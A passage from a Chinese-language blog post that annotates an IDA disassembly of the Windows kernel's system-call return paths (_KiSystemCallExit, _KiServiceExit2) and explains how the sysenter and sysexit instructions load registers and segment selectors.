_KiSystemCallExit</span><br><span class="line">.text:<span class="number">0046</span>A71B                 pop     edx             <span class="comment">// edx = eip3</span></span><br><span class="line">.text:<span class="number">0046</span>A71C                 pop     ecx             <span class="comment">// 从栈中移除cs</span></span><br><span class="line">.text:<span class="number">0046</span>A71D                 popf</span><br><span class="line">.text:<span class="number">0046</span>A71E                 jmp     edx</span><br><span class="line">.text:<span class="number">0046</span>A720 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A720</span><br><span class="line">.text:<span class="number">0046</span>A720 _KiSystemCallExit:                      <span class="comment">// CODE XREF: _KiSystemCallExitBranch↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A720                                         <span class="comment">// _KiSystemCallExit2+5↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A720                                         <span class="comment">// DATA XREF: ...</span></span><br><span class="line">.text:<span class="number">0046</span>A720                 iret</span><br><span class="line">.text:<span class="number">0046</span>A720 _KiSystemCallExitBranch endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A720</span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 _KiSystemCallExit2 proc near            <span class="comment">// DATA XREF: KiRestoreFastSyscallReturnState()+16↑o</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721 arg_5           = byte ptr  <span class="number">9</span></span><br><span class="line">.text:<span class="number">0046</span>A721</span><br><span class="line">.text:<span class="number">0046</span>A721                 test    [esp+arg_5], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A726                 jnz     <span class="keyword">short</span> _KiSystemCallExit <span class="comment">// ===========================================================</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// EFLAG3.TF（Trap flag）!= 0，也就是说是从陷井进来的0环，不是快速调用进来的。</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 注意，这里首先测试 eflags 标志寄存器中的TF（陷阱） 标志是必要的，因为</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 在 Pentium II 以后的 Windows 系统上，若应用程序绕过KiFastSystemCall，而直接</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 利用 “int 2e” 指令进入内核，那么，在此处将会被检测到，从而通过irerd 返回，</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 这样就不会发生进人内核模式和返回用户模式不对称的情形。</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">//</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// 《Windows内核原理与实现》 P554</span></span><br><span class="line">.text:<span class="number">0046</span>A726                                         <span class="comment">// ====================================================================</span></span><br><span class="line">.text:<span class="number">0046</span>A728                 pop     edx             <span class="comment">// esp指向EIP3（+0x68）</span></span><br><span class="line">.text:<span class="number">0046</span>A729                 add     esp, <span class="number">4</span>          <span class="comment">// 从栈中移除cs，此时 esp 指向eflag3</span></span><br><span class="line">.text:<span class="number">0046</span>A72C                 <span class="keyword">and</span>     [esp<span class="number">-8</span>+arg_5], <span class="number">0F</span>Dh <span class="comment">// 禁止eflags中的中断标志</span></span><br><span class="line">.text:<span class="number">0046</span>A731                 popf</span><br><span class="line">.text:<span class="number">0046</span>A732                 pop     ecx             <span class="comment">// 弹出esp</span></span><br><span class="line">.text:<span class="number">0046</span>A733                 sti                     <span class="comment">// 恢复中断，因为sysexit指令不会恢复中断标志</span></span><br><span class="line">.text:<span class="number">0046</span>A734                 sysexit                 <span class="comment">// 返回用户模式</span></span><br><span class="line">.text:<span class="number">0046</span>A736                 iret</span><br><span class="line">.text:<span class="number">0046</span>A736 _KiSystemCallExit2 endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A736</span><br><span class="line">.text:<span class="number">0046</span>A736 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A737                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A738 <span class="comment">// START OF FUNCTION CHUNK FOR _KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A738</span><br><span class="line">.text:<span class="number">0046</span>A738 loc_46A738:                             <span class="comment">// CODE XREF: _KiServiceExit+8F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A738                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h <span class="comment">// 异常链表非空，有异常需要处理</span></span><br><span class="line">.text:<span class="number">0046</span>A73F                 jnz     <span class="keyword">short</span> loc_46A74E</span><br><span class="line">.text:<span class="number">0046</span>A741                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A748                 jz      loc_46A6BF      <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A74E</span><br><span class="line">.text:<span class="number">0046</span>A74E loc_46A74E:                             <span class="comment">// CODE XREF: _KiServiceExit+111↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A74E                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A750                 mov     esi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A753                 mov     edi, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A756                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A759                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">0046</span>A75C                 mov     ebx, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A75F                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0046</span>A762                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">0046</span>A765                 mov     esi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A768                 mov     edi, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A76B                 mov     ebx, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A76E                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0046</span>A771                 mov     dr6, edi</span><br><span class="line">.text:<span class="number">0046</span>A774                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A777                 jmp     loc_46A6BF      <span class="comment">// 判断是否是V86（虚拟8086即16位操作系统）</span></span><br><span class="line">.text:<span class="number">0046</span>A77C <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A77C</span><br><span class="line">.text:<span class="number">0046</span>A77C loc_46A77C:                             <span class="comment">// CODE XREF: _KiServiceExit+BA↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A77C                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A780                 add     esp, <span class="number">30</span>h</span><br><span class="line">.text:<span class="number">0046</span>A783                 pop     gs</span><br><span class="line">.text:<span class="number">0046</span>A785                 pop     es</span><br><span class="line">.text:<span class="number">0046</span>A786                 assume es:nothing</span><br><span class="line">.text:<span class="number">0046</span>A786                 pop     ds</span><br><span class="line">.text:<span class="number">0046</span>A787                 assume ds:_data</span><br><span class="line">.text:<span class="number">0046</span>A787                 pop     edx</span><br><span class="line">.text:<span class="number">0046</span>A788                 pop     ecx</span><br><span class="line">.text:<span class="number">0046</span>A789                 jmp     loc_46A6F5</span><br><span class="line">.text:<span class="number">0046</span>A78E <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A78E</span><br><span class="line">.text:<span class="number">0046</span>A78E loc_46A78E:                             <span class="comment">// CODE XREF: _KiServiceExit+A6↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A78E                 mov     ebx, [esp+arg_C] <span class="comment">// CS最低位为0，说明先前模式是0</span></span><br><span class="line">.text:<span class="number">0046</span>A792                 mov     [esp+arg_68], ebx</span><br><span class="line">.text:<span class="number">0046</span>A796                 mov     ebx, [esp+arg_10]</span><br><span class="line">.text:<span class="number">0046</span>A79A                 sub     ebx, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A79D                 mov     [esp+arg_60], ebx</span><br><span class="line">.text:<span class="number">0046</span>A7A1                 mov     esi, [esp+arg_6C]</span><br><span class="line">.text:<span class="number">0046</span>A7A5                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A7A8                 mov     esi, [esp+arg_68]</span><br><span class="line">.text:<span class="number">0046</span>A7AC                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A7AF                 mov     esi, [esp+arg_64]</span><br><span class="line">.text:<span class="number">0046</span>A7B3                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">0046</span>A7B5                 add     esp, <span class="number">54</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7B8                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A7B9                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A7BA                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A7BB                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A7BC                 mov     esp, [esp<span class="number">-64</span>h+arg_60]</span><br><span class="line">.text:<span class="number">0046</span>A7BF                 iret</span><br><span class="line">.text:<span class="number">0046</span>A7BF <span class="comment">// END OF FUNCTION CHUNK FOR _KiServiceExit</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0 <span class="comment">// START OF FUNCTION CHUNK FOR _KiFastCallEntry</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0</span><br><span class="line">.text:<span class="number">0046</span>A7C0 loc_46A7C0:                             <span class="comment">// CODE XREF: _KiFastCallEntry+F2↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A7C0                 test    byte ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                 jz      loc_46A618      <span class="comment">// 可以得知：当前函数的堆栈（也是当前线程的堆栈）从栈顶到栈底的分布情况：</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 1. 从3环拷贝过来的3环API参数</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 2. Trapframe（共0x8C字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A7C4                                         <span class="comment">// 3. 浮点寄存器（共0x210字节）</span></span><br><span class="line">.text:<span class="number">0046</span>A7CA                 mov     eax, <span class="number">0</span>C0000005h</span><br><span class="line">.text:<span class="number">0046</span>A7CF                 jmp     loc_46A61C</span><br><span class="line">.text:<span class="number">0046</span>A7CF <span class="comment">// END OF FUNCTION CHUNK FOR _KiFastCallEntry</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 <span class="comment">// =============== S U B R O U T I N E =======================================</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 _KiServiceExit2 proc near               <span class="comment">// CODE XREF: NtContinue(x,x)+3B↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4                                         <span class="comment">// NtRaiseException(x,x,x)+3E↓j ...</span></span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_C           = dword ptr  <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_10          = dword ptr  <span class="number">14</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_38          = dword ptr  <span class="number">3</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_3C          = dword ptr  <span class="number">40</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_40          = dword ptr  <span class="number">44</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_44          = dword ptr  <span class="number">48</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_48          = dword ptr  <span class="number">4</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_60          = dword ptr  <span class="number">64</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_64          = dword ptr  <span class="number">68</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_68          = dword ptr  <span class="number">6</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A7D4 arg_6C          = dword ptr  <span class="number">70</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7D4</span><br><span class="line">.text:<span class="number">0046</span>A7D4                 cli</span><br><span class="line">.text:<span class="number">0046</span>A7D5                 test    [ebp+_KTRAP_FRAME.EFlags], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A7DC                 jnz     <span class="keyword">short</span> loc_46A7E4 <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A7DE                 test    byte ptr [ebp+_KTRAP_FRAME.SegCs], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A7E2                 jz      <span class="keyword">short</span> loc_46A818</span><br><span class="line">.text:<span class="number">0046</span>A7E4</span><br><span class="line">.text:<span class="number">0046</span>A7E4 loc_46A7E4:                             <span class="comment">// CODE XREF: _KiServiceExit2+8↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A7E4                                         <span class="comment">// _KiServiceExit2+42↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A7E4                 mov     ebx, large fs:<span class="number">124</span>h <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A7EB                 mov     [ebx+_KTHREAD.Alerted], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A7EF                 cmp     [ebx+_KTHREAD.ApcState.UserApcPending], <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A7F3                 jz      <span class="keyword">short</span> loc_46A818</span><br><span class="line">.text:<span class="number">0046</span>A7F5                 mov     ebx, ebp</span><br><span class="line">.text:<span class="number">0046</span>A7F7                 mov     ecx, <span class="number">1</span>          <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A7FC                 call    ds:__imp_@KfRaiseIrql@<span class="number">4</span> <span class="comment">// KfRaiseIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A802                 push    eax</span><br><span class="line">.text:<span class="number">0046</span>A803                 sti</span><br><span class="line">.text:<span class="number">0046</span>A804                 push    ebx</span><br><span class="line">.text:<span class="number">0046</span>A805                 push    <span class="number">0</span></span><br><span class="line">.text:<span class="number">0046</span>A807                 push    <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A809                 call    _KiDeliverApc@<span class="number">12</span> <span class="comment">// VOID KiDeliverApc (</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN KPROCESSOR_MODE PreviousMode,</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN PKEXCEPTION_FRAME ExceptionFrame,</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     IN PKTRAP_FRAME TrapFrame</span></span><br><span class="line">.text:<span class="number">0046</span>A809                                         <span class="comment">//     )</span></span><br><span class="line">.text:<span class="number">0046</span>A80E                 pop     ecx             <span class="comment">// NewIrql</span></span><br><span class="line">.text:<span class="number">0046</span>A80F                 call    ds:__imp_@KfLowerIrql@<span class="number">4</span> <span class="comment">// KfLowerIrql(x)</span></span><br><span class="line">.text:<span class="number">0046</span>A815                 cli</span><br><span class="line">.text:<span class="number">0046</span>A816                 jmp     <span class="keyword">short</span> loc_46A7E4 <span class="comment">// 虚拟8086/3环</span></span><br><span class="line">.text:<span class="number">0046</span>A818 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A818</span><br><span class="line">.text:<span class="number">0046</span>A818 loc_46A818:                             <span class="comment">// CODE XREF: _KiServiceExit2+E↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A818                                         <span class="comment">// _KiServiceExit2+1F↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A818                 mov     edx, [esp+_KTRAP_FRAME.ExceptionList]</span><br><span class="line">.text:<span class="number">0046</span>A81C                 mov     ebx, large fs:_KPCR.DebugActive</span><br><span class="line">.text:<span class="number">0046</span>A823                 mov     large fs:_KPCR, edx</span><br><span class="line">.text:<span class="number">0046</span>A82A                 mov     ecx, [esp+_KTRAP_FRAME.PreviousPreviousMode]</span><br><span class="line">.text:<span class="number">0046</span>A82E                 mov     esi, large fs:<span class="number">124</span>h</span><br><span class="line">.text:<span class="number">0046</span>A835                 mov     [esi+_KTHREAD.PreviousMode], cl</span><br><span class="line">.text:<span class="number">0046</span>A83B                 test    ebx, <span class="number">0F</span>Fh</span><br><span class="line">.text:<span class="number">0046</span>A841                 jnz     <span class="keyword">short</span> loc_46A894</span><br><span class="line">.text:<span class="number">0046</span>A843</span><br><span class="line">.text:<span class="number">0046</span>A843 loc_46A843:                             <span class="comment">// CODE XREF: _KiServiceExit2+D0↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A843                                         <span class="comment">// _KiServiceExit2+FB↓j</span></span><br><span class="line">.text:<span class="number">0046</span>A843                 test    [esp+arg_6C], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A84B                 jnz     loc_46AFD8      <span class="comment">// 虚拟8086模式</span></span><br><span class="line">.text:<span class="number">0046</span>A851                 test    word ptr [esp+arg_68], <span class="number">0F</span>FF8h</span><br><span class="line">.text:<span class="number">0046</span>A858                 jz      <span class="keyword">short</span> loc_46A8D4</span><br><span class="line">.text:<span class="number">0046</span>A85A                 mov     edx, [esp+arg_38]</span><br><span class="line">.text:<span class="number">0046</span>A85E                 mov     ecx, [esp+arg_3C]</span><br><span class="line">.text:<span class="number">0046</span>A862                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A866                 cmp     word ptr [ebp+<span class="number">6</span>Ch], <span class="number">8</span></span><br><span class="line">.text:<span class="number">0046</span>A86B                 jz      <span class="keyword">short</span> loc_46A879</span><br><span class="line">.text:<span class="number">0046</span>A86D                 lea     esp, [ebp+<span class="number">30</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A870                 pop     gs</span><br><span class="line">.text:<span class="number">0046</span>A872                 pop     es</span><br><span class="line">.text:<span class="number">0046</span>A873                 pop     ds</span><br><span class="line">.text:<span class="number">0046</span>A874                 lea     esp, [ebp+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A877                 pop     fs</span><br><span class="line">.text:<span class="number">0046</span>A879</span><br><span class="line">.text:<span class="number">0046</span>A879 loc_46A879:                             <span class="comment">// CODE XREF: _KiServiceExit2+97↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A879                 lea     esp, [ebp+<span class="number">54</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A87C                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A87D                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A87E                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A87F                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A880                 cmp     word ptr [esp<span class="number">-60</span>h+arg_64], <span class="number">80</span>h</span><br><span class="line">.text:<span class="number">0046</span>A887                 ja      loc_46AFF4</span><br><span class="line">.text:<span class="number">0046</span>A88D                 add     esp, <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A890                 iret</span><br><span class="line">.text:<span class="number">0046</span>A890 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A891                 align <span class="number">4</span></span><br><span class="line">.text:<span class="number">0046</span>A894</span><br><span class="line">.text:<span class="number">0046</span>A894 loc_46A894:                             <span class="comment">// CODE XREF: _KiServiceExit2+6D↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A894                 test    dword ptr [ebp+<span class="number">70</span>h], <span class="number">20000</span>h</span><br><span class="line">.text:<span class="number">0046</span>A89B                 jnz     <span class="keyword">short</span> loc_46A8A6</span><br><span class="line">.text:<span class="number">0046</span>A89D                 test    dword ptr [ebp+<span class="number">6</span>Ch], <span class="number">1</span></span><br><span class="line">.text:<span class="number">0046</span>A8A4                 jz      <span class="keyword">short</span> loc_46A843</span><br><span class="line">.text:<span class="number">0046</span>A8A6</span><br><span class="line">.text:<span class="number">0046</span>A8A6 loc_46A8A6:                             <span class="comment">// CODE XREF: _KiServiceExit2+C7↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A8A6                 <span class="keyword">xor</span>     ebx, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8A8                 mov     esi, [ebp+<span class="number">18</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8AB                 mov     edi, [ebp+<span class="number">1</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A8AE                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8B1                 mov     dr0, esi</span><br><span class="line">.text:<span class="number">0046</span>A8B4                 mov     ebx, [ebp+<span class="number">20</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8B7                 mov     dr1, edi</span><br><span class="line">.text:<span class="number">0046</span>A8BA                 mov     dr2, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8BD                 mov     esi, [ebp+<span class="number">24</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8C0                 mov     edi, [ebp+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0046</span>A8C3                 mov     ebx, [ebp+<span class="number">2</span>Ch]</span><br><span class="line">.text:<span class="number">0046</span>A8C6                 mov     dr3, esi</span><br><span class="line">.text:<span class="number">0046</span>A8C9                 mov     dr6, edi</span><br><span class="line">.text:<span class="number">0046</span>A8CC                 mov     dr7, ebx</span><br><span class="line">.text:<span class="number">0046</span>A8CF                 jmp     loc_46A843</span><br><span class="line">.text:<span class="number">0046</span>A8D4 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A8D4</span><br><span class="line">.text:<span class="number">0046</span>A8D4 loc_46A8D4:                             <span class="comment">// CODE XREF: _KiServiceExit2+84↑j</span></span><br><span class="line">.text:<span class="number">0046</span>A8D4                 mov     ebx, [esp+arg_C]</span><br><span class="line">.text:<span class="number">0046</span>A8D8                 mov     [esp+arg_68], ebx</span><br><span class="line">.text:<span class="number">0046</span>A8DC                 mov     ebx, [esp+arg_10]</span><br><span class="line">.text:<span class="number">0046</span>A8E0                 sub     ebx, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">0046</span>A8E3                 mov     [esp+arg_60], ebx</span><br><span class="line">.text:<span class="number">0046</span>A8E7                 mov     esi, [esp+arg_6C]</span><br><span class="line">.text:<span class="number">0046</span>A8EB                 mov     [ebx+<span class="number">8</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A8EE                 mov     esi, [esp+arg_68]</span><br><span class="line">.text:<span class="number">0046</span>A8F2                 mov     [ebx+<span class="number">4</span>], esi</span><br><span class="line">.text:<span class="number">0046</span>A8F5                 mov     esi, [esp+arg_64]</span><br><span class="line">.text:<span class="number">0046</span>A8F9                 mov     [ebx], esi</span><br><span class="line">.text:<span class="number">0046</span>A8FB                 mov     eax, [esp+arg_40]</span><br><span class="line">.text:<span class="number">0046</span>A8FF                 mov     edx, [esp+arg_38]</span><br><span class="line">.text:<span class="number">0046</span>A903                 mov     ecx, [esp+arg_3C]</span><br><span class="line">.text:<span class="number">0046</span>A907                 add     esp, <span class="number">54</span>h</span><br><span class="line">.text:<span class="number">0046</span>A90A                 pop     edi</span><br><span class="line">.text:<span class="number">0046</span>A90B                 pop     esi</span><br><span class="line">.text:<span class="number">0046</span>A90C                 pop     ebx</span><br><span class="line">.text:<span class="number">0046</span>A90D                 pop     ebp</span><br><span class="line">.text:<span class="number">0046</span>A90E                 mov     esp, [esp<span class="number">-64</span>h+arg_60]</span><br><span class="line">.text:<span class="number">0046</span>A911                 iret</span><br><span class="line">.text:<span class="number">0046</span>A911 _KiServiceExit2 endp <span class="comment">// sp-analysis failed</span></span><br><span class="line">.text:<span class="number">0046</span>A911</span><br><span class="line">.text:<span class="number">0046</span>A912 <span class="comment">// ---------------------------------------------------------------------------</span></span><br><span class="line">.text:<span class="number">0046</span>A912                 retn</span><br><span class="line">.text:<span class="number">0046</span>A912 <span class="comment">// ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong>可以看到无论是从函数KiSystemService，还是从函数KiFastCallEntry往下分析，都会调用地址<code>0046A5AF      </code>，只是在调用该地址前初始化工作有些不同。</p>
<p>进入地址<code>0046A5AF      </code>前，eax保存系统服务号，edx都指向3环API的参数起始地址。</p>
<p>往下的代码段 将会放到下一节开始分析余下的两个问题：</p>
<ol>
<li>如何根据系统调用号（eax中存储）找到要执行的内核函数？</li>
<li>调用时参数是存储到3环的堆栈，如何传递给内核函数？</li>
</ol>
<p>可参考：</p>
<ul>
<li><a href="https://www.52pojie.cn/thread-1525669-1-1.html">系统调用(R3API调用过程详解) </a></li>
<li><a href="https://blog.csdn.net/m0_46125480/article/details/120705973?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_paycolumn_v3&utm_relevant_index=2">逆向分析KiFastCallEntry(Win7 x86)</a></li>
</ul>
<h2 id="6-从0环回3环"><a href="#6-从0环回3环" class="headerlink" title="6 从0环回3环"></a>6 从0环回3环</h2><h3 id="6-1-中断返回"><a href="#6-1-中断返回" class="headerlink" title="6.1 中断返回"></a>6.1 中断返回</h3><h3 id="6-2-快速调用返回"><a href="#6-2-快速调用返回" class="headerlink" title="6.2 快速调用返回"></a>6.2 快速调用返回</h3><div class="note warning"><p><mark class="label danger">sysenter</mark>指令执行步骤如下：</p>
<ol>
<li>将<code>IA32_SYSENTER_CS</code>保存到 CS中。</li>
<li>将<code>IA32_SYSENTER_EIP</code>保存到 EIP 中。</li>
<li>将<code>IA32_SYSENTER_CS + 8</code>保存到 SS 中。</li>
<li>将<code>IA32_SYSENTER_ESP</code>保存到 ESP 寄存器中。</li>
<li>切换到 R0 级别。</li>
<li>如果 EFLAGS 中的 VM 标志被设定，那么清 0 该标志。</li>
<li>开始执行 R0 代码。</li>
</ol>
</div>

<div class="note warning"><p><mark class="label success">sysexit</mark>指令执行前需要如下准备工作：设置EDX为ring3下要执行的指令的首地址。设置ECX为ring3下的栈指针。<br><code>sysexit</code>指令的执行步骤如下：</p>
<ol>
<li>将<code>IA32_SYSENTER_CS + 16</code>保存到 CS 中。(R3下代码段)</li>
<li>将 EDX 赋值给 EIP。</li>
<li>将<code>IA32_SYSENTER_CS + 24</code>保存到 SS 中。</li>
<li>将 ECX 赋值给 ESP。</li>
<li>切换到 R3 下继续执行 R3 代码。</li>
</ol>
</div>

<table>
<thead>
<tr>
<th>指令</th>
<th>寄存器的值</th>
<th>寄存器填装</th>
<th>对应GDT段描述符</th>
</tr>
</thead>
<tbody><tr>
<td>sysenter</td>
<td>CS &#x3D; 0x1B、SS &#x3D; 0x23、FS &#x3D; 0x3B<br />DS &#x3D; 0x23、ES &#x3D; 0x23、GS &#x3D; 0</td>
<td>CS0 &#x3D; IA32_SYSENTER_CS<br >SS0 &#x3D; IA32_SYSENTER_CS + 8<br />ESP0 &#x3D; IA32_SYSENTER_ESP（临时）<br />EIP0 &#x3D; IA32_SYSENTER_EIP</td>
<td>R0：<br />CS0 &#x3D; 0x8，00001 0 00，Index &#x3D; 1，GDT_CS &#x3D; 00cf9b00`0000ffff。<br />SS0 &#x3D; GDT_CS + 8，–&gt; Index &#x3D; 2，GDT_SS0 &#x3D; 00cf9300`0000ffff。</td>
</tr>
<tr>
<td>sysexit</td>
<td>CS &#x3D; 0x8、SS &#x3D; 0x10、FS &#x3D; 0x30<br />DS &#x3D; 0x23、ES &#x3D; 0x23、GS &#x3D; 0</td>
<td>CS3 &#x3D; IA32_SYSENTER_CS + 16<br >SS3 &#x3D; IA32_SYSENTER_CS + 24<br />ESP3 &#x3D; ECX<br />EIP3 &#x3D; EDX</td>
<td>R3：<br />CS3 &#x3D; GDT_CS + 16，–&gt; Index &#x3D; 3，GDT_CS3 &#x3D; 00cffb00`0000ffff。<br />SS3 &#x3D; GDT_CS + 24，–&gt; Index &#x3D; 4，GDT_SS3 &#x3D; 00cff300&#96;0000ffff。</td>
</tr>
</tbody></table>
